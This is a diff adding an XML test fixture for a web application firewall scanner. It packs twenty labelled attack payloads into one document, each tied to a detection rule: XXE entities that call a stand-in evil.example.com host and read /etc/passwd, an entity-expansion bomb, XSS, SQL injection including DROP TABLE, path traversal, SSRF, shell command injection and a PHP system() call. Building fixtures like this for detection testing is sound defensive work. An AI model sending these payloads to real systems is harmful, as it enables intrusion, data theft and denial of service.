@@ -1,0 +1,89 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!--
+  examples/malicious.xml
+  Demonstrates multiple WAF rule violations in a single document.
+  DO NOT submit this to a live endpoint — it will be blocked (and rightly so).
+  Use it with the scanner to see which rules fire and why.
+-->
+
+<!-- ① XXE via DOCTYPE SYSTEM (Rule 921160) -->
+<!DOCTYPE order SYSTEM "http://evil.example.com/evil.dtd" [
+  <!ELEMENT order ANY>
+  <!-- ② External entity declaration – SYSTEM URI (Rule 921162) -->
+  <!ENTITY secret SYSTEM "file:///etc/passwd">
+  <!-- ③ PUBLIC entity (Rule 921163) -->
+  <!ENTITY remote PUBLIC "-//ATTACKER//DTD" "http://evil.example.com/attack.dtd">
+  <!-- ④ XML Bomb – ten+ entity definitions (Rule 921171) -->
+  <!ENTITY a0 "AAAAAAAAAA">
+  <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
+  <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
+  <!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
+  <!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
+  <!ENTITY a5 "&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;">
+  <!ENTITY a6 "&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;">
+  <!ENTITY a7 "&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;">
+  <!ENTITY a8 "&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;">
+  <!ENTITY a9 "&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;">
+]>
+
+<order>
+
+  <!-- ⑤ file:// protocol reference (Rule 921164) -->
+  <resourcePath>file:///etc/shadow</resourcePath>
+
+  <customer>
+    <name>Alice</name>
+
+    <!-- ⑥ XSS: <script> tag (Rule 941100) -->
+    <bio><![CDATA[Hello <script>alert('xss')</script> world]]></bio>
+
+    <!-- ⑦ XSS: inline event handler (Rule 941110) -->
+    <profileUrl onclick="stealCookies()">https://example.com</profileUrl>
+
+    <!-- ⑧ XSS: javascript: URI (Rule 941120) -->
+    <homePage>javascript:alert(document.cookie)</homePage>
+
+    <!-- ⑨ XSS: iframe embed (Rule 941130) -->
+    <widget><iframe src="https://evil.example.com/phish"></iframe></widget>
+  </customer>
+
+  <search>
+    <!-- ⑩ SQL Injection: UNION SELECT (Rule 942100) -->
+    <query>' UNION SELECT username, password FROM users --</query>
+
+    <!-- ⑪ SQL Injection: stacked query (Rule 942340) -->
+    <filter>active; DROP TABLE users;</filter>
+
+    <!-- ⑫ SQL Injection: tautology bypass (Rule 942260) -->
+    <login>' OR 'a'='a</login>
+
+    <!-- ⑬ SQL Injection: dangerous function (Rule 942410) -->
+    <timing>1 AND SLEEP(5)--</timing>
+  </search>
+
+  <file>
+    <!-- ⑭ Path traversal (Rule 930100) -->
+    <path>../../../../etc/passwd</path>
+
+    <!-- ⑮ URL-encoded traversal (Rule 930110) -->
+    <encodedPath>..%2f..%2f..%2fetc%2fshadow</encodedPath>
+  </file>
+
+  <!-- ⑯ SSRF: internal address (Rule 934100) -->
+  <webhook>http://192.168.1.1/admin/reset</webhook>
+
+  <exec>
+    <!-- ⑰ RCE: shell command injection (Rule 932100) -->
+    <cmd>$(cat /etc/passwd)</cmd>
+
+    <!-- ⑱ RCE: template injection (Rule 932110) -->
+    <template>{{7*7}}</template>
+  </exec>
+
+  <!-- ⑲ Dangerous processing instruction (Rule 921180) -->
+  <?php system('id'); ?>
+
+  <!-- ⑳ Consecutive entity references – bomb signature (Rule 921170) -->
+  <bombed>&a9;&a9;&a9;&a9;</bombed>
+
+</order>
